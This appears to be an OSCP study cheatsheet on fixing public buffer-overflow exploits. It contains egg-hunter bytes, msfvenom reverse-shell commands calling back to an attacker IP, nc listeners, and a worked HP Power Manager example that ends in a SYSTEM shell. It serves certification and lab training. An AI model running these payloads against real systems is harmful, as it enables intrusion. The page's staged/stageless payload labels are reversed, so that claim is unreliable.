---
title: "Buffer Overflows & Exploit Fixing"
date: 2026-06-20
weight: 140
draft: false
summary: "Procedures for adapting a public BOF exploit to the target environment."
---

Procedures for adapting a public BOF exploit to the target.

- Source: https://heretek.dev/oscp-cheatsheet/buffer-overflows/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## Exam Notes

- As of November 2024, there is no longer a guarantee that a BOF machine appears on the exam.
- Even so, the ability to fix a public exploit that uses a buffer overflow is still required. This document covers exactly that.

## The Big Picture

A buffer overflow exploit overwrites program memory to hijack the execution flow. Every BOF exploit has the same structure.

```text
[PADDING] + [RETURN ADDRESS] + [NOP SLED] + [SHELLCODE]
```

When fixing a public exploit, our job is mostly just replacing the shellcode with our own. Sometimes you only need to update the RETURN ADDRESS for a different OS version.

## The 5 Components of a BOF Exploit

### 1. PADDING (fills the buffer)

```python
"\x41"*256
```

- `\x41` = the character "A"
- Fills the buffer up to the saved return address
- The number (256) differs per vulnerable app — a value the exploit author already worked out
- No changes needed

### 2. RETURN ADDRESS (hijacks the execution flow)

```python
RET = "\xCF\xBC\x08\x76"  # JMP ESP in MSVCP60.dll
```

- Overwrites the saved return address on the stack
- Points at a `JMP ESP` instruction inside a DLL the app has loaded
- ESP points at whatever comes after RET on the stack, i.e. the shellcode
- OS-version dependent (important) — DLL addresses differ per Windows version
- Usually no changes needed — only change it when attacking a target different from the OS the exploit was tested on

### 3. NOP SLED (landing runway)

```python
"\x90"*32
```

- `\x90` = NOP instruction ("do nothing and move to the next instruction")
- Acts as a runway — even if the jump does not land exactly on the shellcode, execution slides down the NOPs and reaches your code
- No changes needed

### 4. EGG HUNTER (optional — used when the shellcode is too large)

```python
EH = '\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH += '\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH += '\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH += '\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
```

- Small code that scans all of memory looking for a tag (such as `n00bn00b`, `w00tw00t`)
- Used when the buffer space after RET is too small to hold the full shellcode
- The actual shellcode goes somewhere else in the request (e.g. the User-Agent header)
- The egg hunter finds the tag and jumps to the shellcode after it
- The egg hunter code itself needs no changes
- Keeping the tag is required (important) — leave a tag like `"n00bn00b"` at the very start of the SHELL variable

### 5. SHELLCODE (the payload — the part you replace)

```python
SHELL = "n00bn00b"           # <-- egg hunter tag (keep if egg hunter exists)
SHELL += "\x33\xc9\x83..."   # <-- machine code that runs after exploit succeeds
```

- The code that actually executes: reverse shell, bind shell, command execution, etc.
- The part generated with msfvenom and replaced (the replacement target)

## Generating shellcode with msfvenom

### Basic command

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f py -b '<BAD_CHARS>' -v SHELL
```

### Flag reference

- `-p windows/shell_reverse_tcp` — payload: TCP reverse Windows shell
- `LHOST=tun0` — my IP (attacker) — where the shell connects back to
- `LPORT=4444` — my listening port
- `-f py` — output format: Python variable (paste into a Python exploit)
- `-b '\x00\x3a...'` — bad characters to exclude (see below)
- `-v SHELL` — name the output variable SHELL (matches the exploit's variable name)

### Finding bad characters

The author always notes them in a comment. Once you have them, copy the value straight into the `-b` flag.

```python
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f..."
```

Common bad characters and why:

- `\x00` — null byte, terminates C strings
- `\x0a` — newline (`\n`), breaks HTTP headers
- `\x0d` — carriage return (`\r`), breaks HTTP headers
- `\x20` — space, breaks URL/HTTP parsing
- `\x2f` — forward slash (`/`), breaks URLs
- `\x3f` — question mark (`?`), breaks URLs
- `\x25` — percent sign (`%`), breaks URL encoding
- Minimal safe set when there is no bad character list: `-b '\x00'`

### Payload options per target

```bash
# Windows 32-bit reverse shell (most common for OSCP BOF)
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Windows 64-bit reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Linux 32-bit reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Linux 64-bit reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '<BADCHARS>' -v SHELL

# Windows bind shell (target opens port, you connect to it — rare)
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f py -b '<BADCHARS>' -v SHELL
```

### Output formats (match the exploit language)

```bash
-f py       # Python: SHELL = "\xeb\x03..."    (for Python exploits)
-f c        # C:      unsigned char SHELL[] =   (for C exploits)
-f raw      # Raw bytes                         (pipe to file)
-f exe      # Standalone .exe                   (for file upload/transfer)
-f elf      # Standalone Linux binary           (for file upload/transfer)
```

## Full process for fixing a public BOF exploit

### Step 1 — Read the exploit and identify the key elements

- Which PORT does it target?
- What are the BAD CHARACTERS? (check the "badchar" comment)
- Is the shellcode a BIND shell or a REVERSE shell?
- Which OS was it TESTED on?
- Is there an EGG HUNTER? (search for tags like n00bn00b, w00tw00t)
- What is the VARIABLE NAME holding the shellcode? (SHELL, shellcode, buf, etc.)
- Is it PYTHON 2 or PYTHON 3? (tell by whether print has parentheses)

### Step 2 — Generate new shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f py -b '<BAD_CHARS>' -v <VARIABLE_NAME>
```

### Step 3 — Replace the exploit's shellcode

- Delete the contents of the existing SHELL/shellcode variable
- Paste the msfvenom output
- If it is a Python 2.5 or older exploit (print without parentheses), remove the `b` prefix; Python 2.6/2.7 accept it

```python
# msfvenom gives you (Python 3 format):
SHELL =  b""
SHELL += b"\xeb\x03\x59..."

# Change to (Python 2 format):
SHELL =  ""
SHELL += "\xeb\x03\x59..."
```

- If there is an egg hunter: keep the tag on the first line of SHELL

```python
SHELL = ""
SHELL += "n00bn00b"          # <-- KEEP THIS if egg hunter exists
SHELL += "\x33\xc9\x83..."   # <-- your new msfvenom shellcode
```

### Step 4 — Check what else needs changing

- Hardcoded IP? → change it to the target IP
- Hardcoded port? → check it matches the target service
- Hardcoded path? → check it matches the target application
- Content-Length header? → update it if the shellcode size changed significantly

### Step 5 — Start the listener and run

```bash
# Terminal 1: start listener FIRST
nc -lvnp 4444
# or
rlwrap nc -lvnp 4444

# Terminal 2: run exploit
python2 exploit.py $ip        # Python 2 exploit
python3 exploit.py $ip        # Python 3 exploit
```

Things to remember:

- Bind shell (old style) → you connect to the target: `nc $ip 4444`
- Reverse shell (standard) → the target connects to you: `nc -lvnp 4444` (listener first)

## Bind Shell vs Reverse Shell — when to use which

- Reverse shell — the target connects back to you — the default choice (95% of the time)
- Bind shell — the target opens a port and you connect — only when reverse fails (firewall blocks outbound)

Always try a reverse shell first. If it does not work, the target may be blocking outbound traffic with a firewall — switch to a bind shell.

## Troubleshooting — when the exploit does not work

When you do not get a shell:

1. Is it Python 2 or 3? Tell from the exploit's print statements
2. If there was an egg hunter tag, did you keep it?
3. Is LHOST correct? (`ip a` → check tun0)
4. Was the listener running before you sent the exploit?
5. Did you remove the `b` prefix for a Python 2 exploit?

Connection refused / port does not open:

1. Is the target service actually running on the expected port?
2. Did the exploit crash the service? Some BOF exploits only work once — reset the box

Shellcode generation fails / too large:

1. Try a different encoder: add `-e x86/shikata_ga_nai` to msfvenom
2. Use a smaller payload: `windows/shell_reverse_tcp` (staged) is smaller than `windows/shell/reverse_tcp` (stageless)
3. Check whether the exploit comments mention a size constraint

When the OS version differs:

1. The RETURN ADDRESS (RET) is OS-specific
2. If the target OS differs from the exploit's test OS, the RET address may be wrong
3. Look in searchsploit for another version of the exploit targeting your OS
4. On the OSCP, most BOF exploits work as-is with just a shellcode swap

## Real example — HP Power Manager (retired HTB box)

- Service found: HP Power Manager, port 80
- Exploit found: `searchsploit hppower` → `windows/remote/10099.py`
- What reading it revealed:
  - bad chars: `\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x1a`
  - existing shellcode: bind shell on port 4444
  - egg hunter: present (tag = `n00bn00b`)
  - variable name: `SHELL`
  - Python version: Python 2
- New shellcode generated:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x1a' -v SHELL
```

- Shellcode replaced:
  - Delete the existing SHELL contents
  - Paste the new msfvenom output
  - Remove the `b` prefix from every line (Python 2)
  - Keep the `"n00bn00b"` tag at the start of SHELL
- Run:

```bash
# Terminal 1:
nc -lvnp 4444

# Terminal 2:
python2 10099.py $ip
```

Result: SYSTEM shell obtained.

> Read the exploit. Find the shellcode. Find the bad characters. Generate new shellcode. Replace it. Run it. Shell.
